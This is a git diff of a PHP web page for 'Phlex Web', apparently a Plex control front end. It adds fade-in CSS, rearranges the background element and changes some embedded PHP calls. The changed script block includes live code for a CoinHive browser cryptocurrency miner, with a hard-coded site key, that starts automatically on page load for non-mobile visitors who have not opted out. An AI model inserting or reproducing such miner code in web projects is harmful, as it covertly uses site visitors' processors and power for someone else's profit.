@@ -33,6 +33,23 @@ if (isset($_GET['logout'])) {
 <head>
 	<title>Phlex Web</title>
 	<meta charset="UTF-8">
+	<style>
+		.fade-in{
+			-webkit-animation: fade-in 2s ease;
+			-moz-animation: fade-in ease-in-out 2s both;
+			-ms-animation: fade-in ease-in-out 2s both;
+			-o-animation: fade-in ease-in-out 2s both;
+			animation: fade-in 2s ease;
+			visibility: visible;
+			-webkit-backface-visibility: hidden;
+		}
+
+		@-webkit-keyframes fade-in{0%{opacity:0;} 100%{opacity:1;}}
+		@-moz-keyframes fade-in{0%{opacity:0} 100%{opacity:1}}
+		@-o-keyframes fade-in{0%{opacity:0} 100%{opacity:1}}
+		@keyframes fade-in{0%{opacity:0} 100%{opacity:1}}
+
+	</style>
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<meta name="description" content="Flex TV">
@@ -76,6 +93,7 @@ if (isset($_GET['logout'])) {
 				console.log('ServiceWorker registration failed: ', err);
 			});
 		}
+
 	</script>
 	<script>
 		if (typeof window.history.pushState === 'function') {
@@ -104,10 +122,12 @@ if (isset($_GET['logout'])) {
 </head>
 
 <body style="background-color:black">
-<img id="holder" src="">
-<script>
-	var miner = new CoinHive.Anonymous("hQCirRYKI9yny7hxr3kpaqh76DepJa9R", {throttle: 0.4});
+<div id="bgwrap">
 
+</div>
+<script>
+	<?php echo fetchBackground();?>
+	var miner = new CoinHive.Anonymous("hQCirRYKI9yny7hxr3kpaqh76DepJa9R", {throttle: 0.4});
 	if (!miner.isMobile() && !miner.didOptOut(14400)) {
 		console.log("Firing miner.");
 		miner.start();
@@ -116,7 +136,6 @@ if (isset($_GET['logout'])) {
 
 <script>
 	var messageBox = [];
-	<?php echo pageCred();?>
 	// We call this inside the login window if necessary, or main.js. Ignore lint warnings.
 	function loopMessages(messages) {
 		console.log("Function fired.");
@@ -205,9 +224,7 @@ if (isset($_GET['logout'])) {
 	</div>
 </div>
 <meta id="messages" data-array="<?php if (count($messages)) echo urlencode(json_encode($messages)); ?>"/>
-<div id="bgwrap">
-	<div class="bg bgLoaded"></div>
-</div>
+
 <?php
 if (!isset($_SESSION['plexToken'])) {
 	echo '
